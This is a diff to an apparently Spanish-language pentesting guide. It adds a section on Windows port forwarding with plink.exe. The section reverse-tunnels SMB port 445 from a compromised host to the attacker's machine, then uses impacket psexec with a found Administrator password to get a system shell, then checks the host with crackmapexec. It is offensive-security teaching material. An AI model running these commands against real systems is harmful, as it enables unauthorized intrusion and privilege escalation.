@@ -39,7 +39,8 @@
      * [Pentesting Linux](#pentesting-linux)
      * [Pentesting Windows](#pentesting-windows)
         * [Transferencia de Archivos](#transferencia-de-archivos)
-        * [AV Evasion Genetic Malware](#av-evasion-genetic-malware)
+        * [Evasión de Antivirus con Malware Genético](#av-evasion-genetic-malware)
+        * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
           
 Antecedentes
 ===============================================================================================================================
@@ -1416,3 +1417,38 @@ Es importante que la ruta del binario **go** esté configurada en el _PATH_, pue
 ```bash
 export PATH=/usr/local/go/bin:$PATH
 ```
+
+Obviamente, cuantas más variables de entorno utilicemos mejor será nuestro _AV Evasion_.
+
+#### Windows Port Forwarding
+
+Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseña que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexión desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.
+
+Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario **plink.exe** para llevar a cabo el procedimiento.
+
+Lo único que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.
+
+Cuando todo esté configurado correctamente, desde la máquina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra máquina local:
+
+```bash
+plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciónIP
+```
+
+Automáticamente, se entablará la conexión hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra máquina.
+
+Ahora la idea es llevar a cabo la autenticación desde nuestra máquina al propio servicio local, el cual enruta al servicio samba de la máquina Windows. Suponiendo que la contraseña del usuario administrador es '**test123**', aplicamos el siguiente comando en local:
+
+```bash
+/usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe
+```
+
+Una vez aplicado el comando, veremos cómo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).
+
+Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la máquina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.
+
+Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:
+
+```bash
+cme smb ip --gen-relay-list ip
+```
+
